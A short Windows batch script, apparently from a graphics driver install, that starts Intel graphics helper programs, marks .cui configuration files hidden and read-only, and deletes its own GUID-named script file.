@echo off
start igfxEM.exe
start igfxHK.exe
start igfxTray.exe
attrib +R +H +S +A *.cui
del /Q {A6D608F0-0BDE-491A-97AE-5C4B05D86E01}.bat
